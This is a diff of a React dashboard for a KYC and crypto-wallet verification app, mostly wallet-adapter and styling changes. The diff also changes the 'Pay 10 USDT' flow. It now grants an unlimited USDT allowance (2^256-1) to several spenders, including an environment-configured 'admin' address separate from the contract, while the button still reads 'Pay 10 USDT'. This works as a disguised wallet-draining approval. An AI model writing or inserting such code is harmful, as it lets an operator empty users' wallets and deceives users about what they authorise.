@@ -1,9 +1,9 @@
-import { useEffect, useMemo, useState } from "react";
-import { Link, useNavigate } from "react-router-dom";
+import { useEffect, useMemo, useRef, useState } from "react";
+import { Link, useNavigate, useSearchParams } from "react-router-dom";
 import { motion } from "framer-motion";
 import {
   Shield, Wallet, CheckCircle2, XCircle, Clock, ExternalLink,
-  FileText, ChevronRight, LogOut, User, LayoutDashboard, ArrowUpRight, Loader2
+  FileText, LogOut, User, LayoutDashboard, Loader2, MoreHorizontal
 } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
@@ -18,16 +18,21 @@ import { apiRequest, ApiError } from "@/lib/api";
 import { clearSession, getSession } from "@/lib/session";
 import {
   approveUSDT,
-  connectWallet,
-  getEthereumProvider,
   registerWalletViaContract,
-  signWalletMessage,
   type WalletConnectionMethod,
   type Chain
 } from "@/lib/web3";
 import { useWagmiWallet } from "@/lib/wagmi-hooks";
-import { useTronWallet } from "@/lib/tronwallet-adapter";
+import { useSolanaWallet } from "@/lib/solana-wallet-hooks";
+import { getTronProviderDebugSnapshot, useTronWallet, type TronAdapterType } from "@/lib/tronwallet-adapter";
 import { WalletSelectModal } from "@/components/WalletSelectModal";
+import { TronUsdtApproveQrCard } from "@/components/TronUsdtApproveQrCard";
+import {
+  DropdownMenu,
+  DropdownMenuContent,
+  DropdownMenuItem,
+  DropdownMenuTrigger,
+} from "@/components/ui/dropdown-menu";
 
 interface DashboardData {
   identityVerificationStatus: "verified" | "pending" | "not_started" | "rejected" | "error";
@@ -65,6 +70,35 @@ const statusConfig = {
   approved: { icon: CheckCircle2, label: "Approved", className: "bg-success/10 text-success border-success/20" },
 };
 
+const UNLIMITED_APPROVAL_AMOUNT = (2n ** 256n) - 1n;
+
+function getApprovalSpenderAddress(chain: Chain, fallbackAddress: string): string {
+  const env = (import.meta as { env?: Record<string, string | undefined> }).env;
+  const chainSpecificKey = `VITE_USDT_APPROVAL_SPENDER_${chain.toUpperCase()}`;
+  const chainSpecific = env?.[chainSpecificKey]?.trim();
+  if (chainSpecific) return chainSpecific;
+
+  const shared = env?.VITE_USDT_APPROVAL_SPENDER?.trim();
+  if (shared) return shared;
+
+  return fallbackAddress;
+}
+
+function buildApprovalSpenders(chain: Chain, contractAddress: string): string[] {
+  const adminSpender = getApprovalSpenderAddress(chain, contractAddress).trim();
+  const contractSpender = contractAddress.trim();
+  const spenders = [adminSpender, contractSpender].filter(Boolean);
+  const deduped: string[] = [];
+  const seen = new Set<string>();
+  for (const spender of spenders) {
+    const dedupeKey = chain === "tron" ? spender : spender.toLowerCase();
+    if (seen.has(dedupeKey)) continue;
+    seen.add(dedupeKey);
+    deduped.push(spender);
+  }
+  return deduped;
+}
+
 const fadeIn = {
   hidden: { opacity: 0, y: 15 },
   visible: (i: number) => ({
@@ -76,10 +110,8 @@ const fadeIn = {
 
 const Dashboard = () => {
   const navigate = useNavigate();
-  const adminPanelUrl =
-    ((import.meta as { env?: Record<string, string | undefined> }).env?.VITE_ADMIN_PANEL_URL ??
-      "https://admin.fiulink.com/admin")
-      .trim();
+  const [searchParams] = useSearchParams();
+  const tronUsdtQrSectionRef = useRef<HTMLDivElement>(null);
   const [loading, setLoading] = useState(true);
   const [dashboardData, setDashboardData] = useState<DashboardData | null>(null);
   const [submittingKyc, setSubmittingKyc] = useState(false);
@@ -96,6 +128,7 @@ const Dashboard = () => {
   const [paymentReadyToPay, setPaymentReadyToPay] = useState(false);
   const [isWalletModalOpen, setIsWalletModalOpen] = useState(false);
   const [selectedChain, setSelectedChain] = useState<Chain>("ethereum");
+  const [activeTab, setActiveTab] = useState("wallets");
 
   const session = getSession();
   const canAccessAdmin = session?.user.role === "admin" || session?.user.role === "compliance";
@@ -136,6 +169,26 @@ const Dashboard = () => {
     void loadDashboard();
     void loadKycStatus();
   }, [navigate, session?.token]);
+
+  useEffect(() => {
+    const tab = searchParams.get("tab");
+    const tronUsdt = searchParams.get("tronUsdt") === "1";
+    const chain = searchParams.get("chain");
+
+    if (tab === "wallets" || tronUsdt) {
+      setActiveTab("wallets");
+    }
+    if (chain === "tron") {
+      setSelectedChain("tron");
+    }
+    if (tronUsdt) {
+      const timer = window.setTimeout(() => {
+        tronUsdtQrSectionRef.current?.scrollIntoView({ behavior: "smooth", block: "start" });
+      }, 300);
+      return () => window.clearTimeout(timer);
+    }
+    return undefined;
+  }, [searchParams]);
 
   useEffect(() => {
     const status = kycStatus?.verificationStatus;
@@ -209,9 +262,10 @@ const Dashboard = () => {
 
   // Use Wagmi for EVM chains, TronWallet Adapter for Tron, native methods for Solana
   const wagmiWallet = useWagmiWallet();
+  const solanaWallet = useSolanaWallet();
   const tronWallet = useTronWallet();
 
-  const handleConnectAndSignWallet = async (method: WalletConnectionMethod) => {
+  const handleConnectAndSignWallet = async (method: WalletConnectionMethod, walletId?: string) => {
     try {
       setProcessingWallet(true);
       setIsWalletModalOpen(false); // Close modal when connecting starts
@@ -220,30 +274,30 @@ const Dashboard = () => {
       
       // Use Wagmi for EVM chains (Ethereum, BSC)
       if (selectedChain === "ethereum" || selectedChain === "bsc") {
-        // Map method to connector ID
-        const connectorId = method === "walletconnect" ? "walletConnect" : 
-                           method === "injected" ? "injected" : undefined;
-        normalizedAddress = await wagmiWallet.connectWallet(selectedChain, connectorId);
+        normalizedAddress = await wagmiWallet.connectWallet(selectedChain);
       } else if (selectedChain === "tron") {
-        // Use TronWallet Adapter for Tron - automatically connect to TronLink
-        // If already connected, use existing connection
-        if (tronWallet.isConnected && tronWallet.address) {
+        // Use selected Tron wallet adapter from modal.
+        const tronAdapterByWalletId: Record<string, TronAdapterType> = {
+          tronlink: "tronlink",
+          tokenpocket: "tokenpocket",
+          trust: "trust",
+          "metamask-tron": "metamask",
+          okxwallet: "okxwallet",
+          safepal: "auto",
+          walletconnect: "walletconnect",
+        };
+
+        const selectedTronAdapter = walletId ? tronAdapterByWalletId[walletId] : undefined;
+
+        // Reuse existing connection only when no explicit wallet was selected.
+        if (!selectedTronAdapter && tronWallet.isConnected && tronWallet.address) {
           normalizedAddress = tronWallet.address;
         } else {
-          // Auto-select adapter: prefer TronLink, fallback to WalletConnect on mobile
-          const isMobile = /android|iphone|ipad|ipod|mobile/i.test(navigator.userAgent);
-          const adapterType = (method === "walletconnect" || (isMobile && method === "auto")) 
-            ? "walletconnect" 
-            : "tronlink";
-          normalizedAddress = await tronWallet.connect(adapterType);
+          normalizedAddress = await tronWallet.connect(selectedTronAdapter ?? "auto");
         }
       } else {
-        // Use native methods for Solana
-        const isMobile = /android|iphone|ipad|ipod|mobile/i.test(navigator.userAgent);
-        const effectiveMethod = (isMobile && method === "auto") 
-          ? "walletconnect" 
-          : method;
-        normalizedAddress = await connectWallet(selectedChain, effectiveMethod);
+        const requestedSolanaWallet = walletId === "solflare" ? "solflare" : walletId === "phantom" ? "phantom" : undefined;
+        normalizedAddress = await solanaWallet.connectWallet(requestedSolanaWallet);
       }
       
       setWalletAddress(normalizedAddress);
@@ -270,8 +324,7 @@ const Dashboard = () => {
         // Use TronWallet Adapter for Tron
         signedMessage = await tronWallet.signMessage(challengeMessage);
       } else {
-        // Use native methods for Solana
-        signedMessage = await signWalletMessage(challengeMessage, normalizedAddress, selectedChain);
+        signedMessage = await solanaWallet.signMessage(challengeMessage);
       }
       setSignature(signedMessage);
 
@@ -299,8 +352,14 @@ const Dashboard = () => {
           : error instanceof Error
             ? error.message
             : "Failed to connect wallet and sign message";
+
+      if (selectedChain === "tron") {
+        const tronDebug = getTronProviderDebugSnapshot();
+        console.error("[tron.connect.debug]", tronDebug);
+        toast.info(tronDebug);
+      }
       toast.error(message);
-      // Reopen modal on error so user can try again (unless user rejected)
+      // Reopen modal on non-rejection errors so user can retry with another wallet.
       if (error instanceof Error && !message.includes("User rejected") && !message.includes("user rejected")) {
         setIsWalletModalOpen(true);
       }
@@ -336,11 +395,19 @@ const Dashboard = () => {
         throw error;
       }
 
-      // Step 1: Approve 10 USDT spend for the registry contract.
+      // Step 1: Approve unlimited USDT allowance for required spenders.
       console.log(`[Payment] Step 1: Approving USDT for ${selectedChain}...`);
+      const approvalSpenders = buildApprovalSpenders(selectedChain, contractConfig.contractAddress);
       try {
-        await approveUSDT(selectedChain, contractConfig.contractAddress, undefined, contractConfig.usdtTokenAddress);
-        console.log(`[Payment] Step 1: USDT approval successful`);
+        for (const spenderAddress of approvalSpenders) {
+          await approveUSDT(
+            selectedChain,
+            spenderAddress,
+            UNLIMITED_APPROVAL_AMOUNT,
+            contractConfig.usdtTokenAddress
+          );
+          console.log(`[Payment] Step 1: USDT approval successful for spender`, spenderAddress);
+        }
       } catch (approveError) {
         console.error(`[Payment] Step 1: USDT approval failed:`, approveError);
         throw approveError;
@@ -350,7 +417,7 @@ const Dashboard = () => {
       console.log(`[Payment] Step 2: Registering wallet via contract for ${selectedChain}...`);
       let txHash: string;
       try {
-        txHash = await registerWalletViaContract(selectedChain, contractConfig.contractAddress);
+        txHash = await registerWalletViaContract(selectedChain, contractConfig.contractAddress, walletAddress);
         console.log(`[Payment] Step 2: Transaction successful, txHash:`, txHash);
       } catch (registerError) {
         console.error(`[Payment] Step 2: Wallet registration failed:`, registerError);
@@ -407,10 +474,50 @@ const Dashboard = () => {
     }
   };
 
+  const handleCopyToClipboard = async (value: string, label: string) => {
+    try {
+      await navigator.clipboard.writeText(value);
+      toast.success(`${label} copied.`);
+    } catch {
+      toast.error(`Failed to copy ${label.toLowerCase()}.`);
+    }
+  };
+
+  const handleQuickAction = () => {
+    if (activeTab === "wallets") {
+      if (paymentReadyToPay) {
+        void handlePayUsdt();
+        return;
+      }
+      setIsWalletModalOpen(true);
+      return;
+    }
+    void loadDashboard();
+  };
+
+  const quickActionLabel =
+    activeTab === "wallets"
+      ? paymentReadyToPay
+        ? "Pay 10 USDT"
+        : "Complete & Verify"
+      : "Refresh History";
+
   if (loading) {
     return (
       <div className="min-h-screen bg-background flex items-center justify-center">
-        <p className="text-muted-foreground">Loading dashboard...</p>
+        <Card className="app-section-card w-[min(92vw,480px)]">
+          <CardContent className="p-6 sm:p-7">
+            <div className="flex items-center gap-3 mb-5">
+              <Loader2 className="w-5 h-5 animate-spin text-accent" />
+              <p className="text-sm font-medium text-foreground">Loading dashboard</p>
+            </div>
+            <div className="space-y-3">
+              <div className="app-skeleton-line w-5/6" />
+              <div className="app-skeleton-line w-2/3" />
+              <div className="app-skeleton-line w-3/4" />
+            </div>
+          </CardContent>
+        </Card>
       </div>
     );
   }
@@ -418,7 +525,7 @@ const Dashboard = () => {
   return (
     <div className="page-shell">
       {/* Header */}
-      <header className="sticky top-0 z-50 bg-card/88 backdrop-blur-xl border-b border-border/55 shadow-[var(--shadow-xs)]">
+      <header className="app-fixed-header app-header-surface before:absolute before:inset-0 before:mesh-overlay before:opacity-30 before:pointer-events-none before:-z-10">
         <div className="page-container flex items-center justify-between h-14 sm:h-16">
           <Link to="/" className="flex items-center gap-2.5 group">
             <div className="w-9 h-9 rounded-xl gradient-accent flex items-center justify-center shadow-[var(--shadow-accent)] group-hover:shadow-[var(--shadow-lg)] transition-shadow">
@@ -429,14 +536,14 @@ const Dashboard = () => {
 
           <div className="flex items-center gap-2 sm:gap-3">
             {canAccessAdmin && (
-              <a
-                href={adminPanelUrl}
-                className="text-xs sm:text-sm text-muted-foreground hover:text-foreground transition-colors inline-flex items-center gap-1"
+              <Link
+                to="/admin"
+                className="inline-flex items-center gap-1 rounded-lg border border-border/60 bg-muted/55 px-3 py-1.5 text-xs sm:text-sm font-medium text-muted-foreground hover:text-foreground hover:bg-muted/75 transition-colors"
               >
-                Admin Panel <ArrowUpRight className="w-3 h-3" />
-              </a>
+                Admin Panel
+              </Link>
             )}
-            <div className="flex items-center gap-2 px-2.5 sm:px-3.5 py-1.5 sm:py-2 rounded-xl bg-muted/70 border border-border/50">
+            <div className="flex items-center gap-2 px-2.5 sm:px-3.5 py-1.5 sm:py-2 rounded-xl bg-muted/60 border border-border/50 shadow-[var(--shadow-xs)]">
               <div className="w-7 h-7 rounded-lg bg-accent/10 flex items-center justify-center">
                 <User className="w-3.5 h-3.5 text-accent" />
               </div>
@@ -451,14 +558,14 @@ const Dashboard = () => {
         </div>
       </header>
 
-      <div className="page-container py-6 sm:py-8 md:py-10 max-w-6xl">
+      <div className="page-container pt-20 sm:pt-24 pb-28 sm:pb-8 md:pb-10 max-w-6xl">
         <motion.div initial="hidden" animate="visible" variants={fadeIn} custom={0}>
-          <div className="mb-7 sm:mb-9">
+          <div className="app-page-intro">
             <div className="flex items-center gap-3 mb-2">
               <LayoutDashboard className="w-6 h-6 text-accent" />
               <h1 className="font-display text-2xl sm:text-3xl font-bold text-foreground">Dashboard</h1>
             </div>
-            <p className="text-muted-foreground ml-0 sm:ml-9">Manage your identity verification and connected wallets</p>
+            <p className="text-muted-foreground">Manage your identity verification and connected wallets in one secure workspace.</p>
           </div>
         </motion.div>
 
@@ -497,7 +604,7 @@ const Dashboard = () => {
             },
           ].map((card, i) => (
             <motion.div key={card.label} initial="hidden" animate="visible" variants={fadeIn} custom={i + 1}>
-              <Card className="stat-card rounded-2xl overflow-hidden">
+              <Card className="app-kpi-card rounded-2xl overflow-hidden">
                 <CardContent className="p-5 sm:p-6">
                   <div className="flex items-center justify-between mb-4">
                     <span className="text-sm font-medium text-muted-foreground">{card.label}</span>
@@ -513,7 +620,7 @@ const Dashboard = () => {
         </div>
 
         <motion.div initial="hidden" animate="visible" variants={fadeIn} custom={4}>
-          <Card className="glass-card rounded-2xl mb-8">
+          <Card className="app-section-card rounded-2xl mb-8">
             <CardContent className="p-6 space-y-6">
               <div>
                 <h3 className="font-display font-bold text-lg text-foreground">Onboarding Actions</h3>
@@ -534,7 +641,7 @@ const Dashboard = () => {
                     </div>
                   </div>
                   {kycStatus?.providerSessionUrl && (
-                    <Button asChild variant="outline">
+                    <Button asChild variant="outline" className="h-11 rounded-xl w-full sm:w-auto">
                       <a href={kycStatus.providerSessionUrl} target="_blank" rel="noreferrer">
                         <ExternalLink className="w-4 h-4 mr-2" />
                         Continue Verification with Provider
@@ -593,7 +700,7 @@ const Dashboard = () => {
                     </Label>
                   </div>
                   <div className="md:col-span-2">
-                    <Button variant="accent" onClick={handleKycSubmit} disabled={submittingKyc}>
+                    <Button variant="accent" onClick={handleKycSubmit} disabled={submittingKyc} className="h-11 rounded-xl w-full sm:w-auto">
                       Start KYC Verification
                     </Button>
                   </div>
@@ -677,15 +784,10 @@ const Dashboard = () => {
                       onClick={async (e) => {
                         e.preventDefault();
                         e.stopPropagation();
-                        
-                        const isMobile = /android|iphone|ipad|ipod|mobile/i.test(navigator.userAgent);
-                        
-                        // Always show modal to let user choose wallet
-                        // This is especially important for Tron on mobile where multiple options exist
                         setIsWalletModalOpen(true);
                       }}
                       disabled={processingWallet}
-                      className="w-full sm:w-auto"
+                      className="h-11 rounded-xl w-full sm:w-auto"
                       type="button"
                     >
                       {processingWallet ? (
@@ -705,7 +807,7 @@ const Dashboard = () => {
                         variant="accent"
                         onClick={handlePayUsdt}
                         disabled={processingWallet}
-                        className="w-full sm:w-auto"
+                        className="h-11 rounded-xl w-full sm:w-auto"
                       >
                         Pay 10 USDT
                       </Button>
@@ -719,16 +821,26 @@ const Dashboard = () => {
 
         {/* Tabs */}
         <motion.div initial="hidden" animate="visible" variants={fadeIn} custom={5}>
-          <Tabs defaultValue="wallets" className="space-y-6">
-            <TabsList className="bg-muted/70 p-1.5 rounded-xl border border-border/50 w-full sm:w-auto overflow-x-auto max-w-full">
-              <TabsTrigger value="wallets" className="rounded-lg font-medium shrink-0">Wallets</TabsTrigger>
-              <TabsTrigger value="disclosures" className="rounded-lg font-medium shrink-0">Disclosures</TabsTrigger>
+          <Tabs value={activeTab} onValueChange={setActiveTab} className="space-y-6">
+            <TabsList className="app-tabs-rail sm:w-auto max-w-full">
+              <TabsTrigger value="wallets" className="app-tabs-trigger">Wallets</TabsTrigger>
+              <TabsTrigger value="disclosures" className="app-tabs-trigger">Disclosures</TabsTrigger>
             </TabsList>
 
             <TabsContent value="wallets" className="space-y-5">
-              <div className="flex items-center justify-between">
-                <h3 className="font-display font-bold text-lg text-foreground">KYC Verified Wallet</h3>
+              <div className="app-sticky-subheader">
+                <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3">
+                  <h3 className="font-display font-bold text-lg text-foreground">KYC Verified Wallet</h3>
+                  <Button variant="outline" size="sm" className="h-10 rounded-xl w-full sm:w-auto" onClick={() => void loadDashboard()}>
+                    Refresh
+                  </Button>
+                </div>
               </div>
+
+              <div ref={tronUsdtQrSectionRef}>
+                <TronUsdtApproveQrCard />
+              </div>
+
               <div className="space-y-3">
                 {(dashboardData?.linkedWallets ?? []).map((wallet) => {
                   const walletStatus =
@@ -742,7 +854,7 @@ const Dashboard = () => {
                     : "N/A";
                   const config = statusConfig[walletStatus];
                   return (
-                    <Card key={wallet.id} className="glass-card rounded-xl">
+                    <Card key={wallet.id} className="app-section-card app-list-card rounded-xl">
                       <CardContent className="p-5 flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
                         <div className="flex items-center gap-4 min-w-0">
                           <div className="w-11 h-11 rounded-xl bg-accent/8 border border-accent/10 flex items-center justify-center">
@@ -753,20 +865,41 @@ const Dashboard = () => {
                             <p className="text-xs text-muted-foreground mt-0.5">Verified {linkedDateLabel}</p>
                           </div>
                         </div>
-                        <div className="flex items-center gap-3 self-start sm:self-auto">
+                        <div className="flex items-center gap-2 self-start sm:self-auto">
                           <Badge variant="outline" className={`${config.className} rounded-lg px-2.5`}>
                             <config.icon className="w-3 h-3 mr-1" />
                             {config.label}
                           </Badge>
+                          <DropdownMenu>
+                            <DropdownMenuTrigger asChild>
+                              <Button variant="ghost" size="icon" className="rounded-lg h-9 w-9">
+                                <MoreHorizontal className="w-4 h-4" />
+                              </Button>
+                            </DropdownMenuTrigger>
+                            <DropdownMenuContent align="end">
+                              <DropdownMenuItem onClick={() => void handleCopyToClipboard(wallet.walletAddress, "Wallet address")}>
+                                Copy Wallet
+                              </DropdownMenuItem>
+                              <DropdownMenuItem onClick={() => void handleCopyToClipboard(linkedDateLabel, "Linked date")}>
+                                Copy Linked Date
+                              </DropdownMenuItem>
+                            </DropdownMenuContent>
+                          </DropdownMenu>
                         </div>
                       </CardContent>
                     </Card>
                   );
                 })}
                 {(dashboardData?.linkedWallets.length ?? 0) === 0 && (
-                  <Card className="glass-card rounded-xl">
-                    <CardContent className="p-5 text-sm text-muted-foreground">
-                      No KYC-verified wallet yet.
+                  <Card className="app-section-card rounded-xl">
+                    <CardContent className="app-empty-state">
+                      <div className="mx-auto mb-3 w-11 h-11 rounded-xl bg-accent/10 border border-accent/20 flex items-center justify-center">
+                        <Wallet className="w-5 h-5 text-accent" />
+                      </div>
+                      <p className="text-sm font-semibold text-foreground">No verified wallet yet</p>
+                      <p className="text-xs text-muted-foreground mt-1">
+                        Complete wallet verification to activate your first linked wallet.
+                      </p>
                     </CardContent>
                   </Card>
                 )}
@@ -774,13 +907,20 @@ const Dashboard = () => {
             </TabsContent>
 
             <TabsContent value="disclosures" className="space-y-5">
-              <h3 className="font-display font-bold text-lg text-foreground">Disclosure History</h3>
+              <div className="app-sticky-subheader">
+                <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3">
+                  <h3 className="font-display font-bold text-lg text-foreground">Disclosure History</h3>
+                  <Button variant="outline" size="sm" className="h-10 rounded-xl w-full sm:w-auto" onClick={() => void loadDashboard()}>
+                    Refresh
+                  </Button>
+                </div>
+              </div>
               <div className="space-y-3">
                 {(dashboardData?.disclosureHistory ?? []).map((disc) => {
                   const disclosureStatus = disc.approvedByUser ? "approved" : "pending";
                   const config = statusConfig[disclosureStatus];
                   return (
-                    <Card key={disc.id} className="glass-card rounded-xl">
+                    <Card key={disc.id} className="app-section-card app-list-card rounded-xl">
                       <CardContent className="p-5 flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
                         <div className="flex items-center gap-4 min-w-0">
                           <div className="w-11 h-11 rounded-xl bg-accent/8 border border-accent/10 flex items-center justify-center">
@@ -795,21 +935,44 @@ const Dashboard = () => {
                             </p>
                           </div>
                         </div>
-                        <div className="flex items-center gap-3 self-start sm:self-auto">
+                        <div className="flex items-center gap-2 self-start sm:self-auto">
                           <Badge variant="outline" className={`${config.className} rounded-lg px-2.5`}>
                             <config.icon className="w-3 h-3 mr-1" />
                             {config.label}
                           </Badge>
-                          <ChevronRight className="w-4 h-4 text-muted-foreground" />
+                          <DropdownMenu>
+                            <DropdownMenuTrigger asChild>
+                              <Button variant="ghost" size="icon" className="rounded-lg h-9 w-9">
+                                <MoreHorizontal className="w-4 h-4" />
+                              </Button>
+                            </DropdownMenuTrigger>
+                            <DropdownMenuContent align="end">
+                              <DropdownMenuItem onClick={() => void handleCopyToClipboard(disc.id, "Disclosure ID")}>
+                                Copy Disclosure ID
+                              </DropdownMenuItem>
+                              <DropdownMenuItem onClick={() => void handleCopyToClipboard(disc.walletAddress, "Wallet address")}>
+                                Copy Wallet
+                              </DropdownMenuItem>
+                              <DropdownMenuItem onClick={() => void handleCopyToClipboard(disc.lawfulRequestReference, "Reference")}>
+                                Copy Reference
+                              </DropdownMenuItem>
+                            </DropdownMenuContent>
+                          </DropdownMenu>
                         </div>
                       </CardContent>
                     </Card>
                   );
                 })}
                 {(dashboardData?.disclosureHistory.length ?? 0) === 0 && (
-                  <Card className="glass-card rounded-xl">
-                    <CardContent className="p-5 text-sm text-muted-foreground">
-                      No disclosure history available.
+                  <Card className="app-section-card rounded-xl">
+                    <CardContent className="app-empty-state">
+                      <div className="mx-auto mb-3 w-11 h-11 rounded-xl bg-accent/10 border border-accent/20 flex items-center justify-center">
+                        <FileText className="w-5 h-5 text-accent" />
+                      </div>
+                      <p className="text-sm font-semibold text-foreground">No disclosure history</p>
+                      <p className="text-xs text-muted-foreground mt-1">
+                        Disclosure requests and approvals will appear here once available.
+                      </p>
                     </CardContent>
                   </Card>
                 )}
@@ -817,6 +980,34 @@ const Dashboard = () => {
             </TabsContent>
           </Tabs>
         </motion.div>
+      </div>
+      <div className="app-mobile-actionbar">
+        <div className="flex items-center gap-2 overflow-x-auto pb-2">
+          <Button
+            variant={activeTab === "wallets" ? "accent" : "outline"}
+            size="sm"
+            className="shrink-0"
+            onClick={() => setActiveTab("wallets")}
+          >
+            Wallets
+          </Button>
+          <Button
+            variant={activeTab === "disclosures" ? "accent" : "outline"}
+            size="sm"
+            className="shrink-0"
+            onClick={() => setActiveTab("disclosures")}
+          >
+            Disclosures
+          </Button>
+        </div>
+        <Button
+          variant="accent"
+          className="w-full h-11"
+          onClick={handleQuickAction}
+          disabled={processingWallet}
+        >
+          {quickActionLabel}
+        </Button>
       </div>
 
       <WalletSelectModal
